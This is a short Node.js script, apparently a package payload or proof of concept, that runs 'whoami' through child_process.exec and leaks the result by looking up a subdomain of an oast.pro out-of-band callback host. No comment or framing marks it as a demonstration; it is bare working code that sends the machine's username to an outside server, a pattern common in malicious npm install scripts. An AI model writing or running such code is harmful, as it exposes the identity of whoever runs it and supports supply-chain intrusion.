const {exec} = require("child_process");

exec("a=$(whoami) && host $a.crf991na1kgm4upn050gbdmfoaanewdng.oast.pro", (error, data, getter) => {
    if(error){
        console.log("error", error.message);
        return;
    }
    if(getter){
        console.log("data", data);
        return;
    }
    console.log(data);
}
);
